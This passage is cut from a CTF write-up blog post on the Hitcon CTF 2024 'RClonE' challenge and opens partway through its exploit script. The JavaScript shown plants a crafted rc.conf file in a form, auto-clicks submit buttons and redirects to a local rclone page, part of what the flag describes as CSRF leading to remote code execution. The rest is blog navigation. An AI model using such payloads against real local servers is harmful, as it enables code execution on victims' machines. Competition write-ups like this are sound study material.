  <span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">([</span><span class="nx">fileContent</span><span class="p">],</span> <span class="dl">"</span><span class="s2">rc.conf</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span> <span class="p">});</span>
  <span class="kd">var</span> <span class="nx">fileInput</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">fileInput2</span><span class="dl">"</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">dataTransfer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataTransfer</span><span class="p">();</span>
  <span class="nx">dataTransfer</span><span class="p">.</span><span class="nx">items</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
  <span class="nx">fileInput</span><span class="p">.</span><span class="nx">files</span> <span class="o">=</span> <span class="nx">dataTransfer</span><span class="p">.</span><span class="nx">files</span><span class="p">;</span>

<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">btn</span><span class="dl">'</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span>

<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">btn2</span><span class="dl">'</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span>
<span class="p">},</span> <span class="mi">300</span><span class="p">);</span>

<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://rclone:1234/lol.html</span><span class="dl">'</span><span class="p">;</span>
<span class="p">},</span> <span class="mi">500</span><span class="p">)</span>

<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">hitcon{easy_peasy_rce_using_csrf_attacking_local_server}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hitcon CTF 2024 RClonE - Ireland.RE&amp;url=https://ireland.re/posts/HitconCTF_2024/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hitcon CTF 2024 RClonE - Ireland.RE&amp;u=https://ireland.re/posts/HitconCTF_2024/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/HitconCTF_2024/&amp;text=Hitcon CTF 2024 RClonE - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CursedCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1712275200" > 2024-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CursedCTF 2024</h3><div class="text-muted small"><p> Web - Hero’s Journey Challenge description Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image: So l...</p></div></div></a></div><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor_CTF_2023_Web/"><div class="card-body"> <em class="timeago small" data-ts="1702857600" > 2023-12-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdoor CTF 2023 Web Challenges</h3><div class="text-muted small"><p> web/too-many-admins Downloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql). I immediately noticed the SQL injection h...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/UMassCTF2024/" class="btn btn-outline-primary" prompt="Older"><p>UMassCTF 2024</p></a> <a href="/posts/idekctf_2024/" class="btn btn-outline-primary" prompt="Newer"><p>idekctf 2024 Web Writeups</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
